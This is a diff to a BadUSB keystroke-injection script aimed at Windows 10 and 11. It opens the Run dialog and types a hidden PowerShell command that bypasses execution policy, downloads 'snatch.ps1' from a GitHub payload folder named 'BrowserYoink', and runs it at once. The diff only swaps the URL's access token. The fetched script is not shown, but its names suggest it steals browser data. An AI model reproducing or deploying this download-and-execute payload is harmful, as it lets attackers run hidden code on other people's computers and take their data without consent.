@@ -8,7 +8,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $AccessToken='';irm https://raw.githubusercontent.com/ApenJulius/BadUSB/main/Payloads/BrowserYoink/snatch.ps1?token=GHSAT0AAAAAACJV7V7KBACKLPG7IPWWD3K6ZKQBHHQ | iex
+STRING powershell -w h -ep bypass $AccessToken='';irm https://raw.githubusercontent.com/ApenJulius/BadUSB/main/Payloads/BrowserYoink/snatch.ps1?token=GHSAT0AAAAAACJV7V7L245LOQCORUQU4ILMZKQCZ7Q | iex
 ENTER
 
 
